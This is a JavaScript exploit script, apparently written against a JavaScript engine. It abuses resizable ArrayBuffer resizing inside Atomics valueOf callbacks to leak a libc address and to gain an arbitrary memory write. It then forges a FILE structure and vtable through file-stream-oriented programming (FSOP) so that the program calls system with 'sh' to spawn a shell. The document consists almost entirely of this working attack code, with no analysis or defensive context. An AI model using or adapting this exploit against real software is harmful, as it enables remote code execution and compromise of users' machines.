// FSOP exploit with just-in-time batch allocation
// Step 1: Leak libc address
let leakBuffer = new ArrayBuffer(2048, { maxByteLength: 4096 });
let leakArr = new BigUint64Array(leakBuffer);

let libcLeak = Atomics.add(leakArr, 0, {
    valueOf: function() {
        leakBuffer.resize(4096);
        return 0n;
    }
});

let libcBase = libcLeak - BigInt("0x1e7b20");

// Key addresses
let systemAddr = libcBase + BigInt("0x53110");
let _IO_list_all = libcBase + BigInt("0x1e84c0");
let _IO_wfile_jumps = libcBase + BigInt("0x1e61c8");
let stdoutLock = libcBase + BigInt("0x1e97b0");

// Layout
let fakeFileAddr = libcBase + BigInt("0x1ee300");
let fakeWideData = fakeFileAddr + BigInt(0x100);
let fakeVtableAddr = fakeWideData + BigInt(0x100);

function arbWrite(targetAddr, valueToWrite) {
    // Allocate fresh batch for each write
    let batch = [];
    for (let i = 0; i < 200; i++) {
        batch.push(new ArrayBuffer(8));
    }

    let vBuf = new ArrayBuffer(72, { maxByteLength: 288 });
    let vArr = new BigUint64Array(vBuf);
    let sp = [];
    let id = 0;

    let tr = {
        valueOf: function() {
            vBuf.resize(288);
            for (let i = 0; i < 100 && id < batch.length; i++) {
                let arr = new BigUint64Array(batch[id++]);
                sp.push(arr);
            }
            return targetAddr;
        }
    };

    Atomics.store(vArr, 7, tr);
    sp[0][0] = valueToWrite;
}

// FILE structure
let cmdStr = BigInt("0x00687320");  // " sh\0"

arbWrite(fakeFileAddr, cmdStr);                           // _flags = " sh\0"
arbWrite(fakeFileAddr + BigInt(0x88), stdoutLock);        // _lock
arbWrite(fakeFileAddr + BigInt(0xa0), fakeWideData);      // _wide_data
arbWrite(fakeFileAddr + BigInt(0xc0), BigInt(1));         // _mode = 1
arbWrite(fakeFileAddr + BigInt(0xd8), _IO_wfile_jumps);   // vtable

// wide_data structure
arbWrite(fakeWideData + BigInt(0x20), BigInt(1));         // _IO_write_ptr = 1
arbWrite(fakeWideData + BigInt(0xe0), fakeVtableAddr);    // _wide_vtable -> our fake vtable

// Fake vtable - __doallocate is at offset 0x68
arbWrite(fakeVtableAddr + BigInt(0x68), systemAddr);      // __doallocate = system

// Link to _IO_list_all (LAST operation)
arbWrite(_IO_list_all, fakeFileAddr);
